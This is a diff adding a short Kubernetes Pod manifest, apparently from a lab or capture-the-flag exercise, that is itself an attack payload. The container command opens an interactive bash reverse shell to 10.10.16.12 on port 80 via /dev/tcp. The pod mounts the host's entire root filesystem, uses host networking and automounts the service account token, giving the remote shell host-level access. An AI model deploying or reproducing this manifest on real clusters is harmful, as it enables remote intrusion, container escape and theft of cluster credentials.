@@ -1,0 +1,20 @@
+apiVersion: v1 
+kind: Pod
+metadata:
+  name: baturu21
+  namespace: default
+spec:
+  containers:
+  - name: baturu21
+    image: nginx:1.14.2
+    command: ["/bin/bash"]
+    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.16.12/80 0>&1"]
+    volumeMounts: 
+    - mountPath: /root
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:  
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
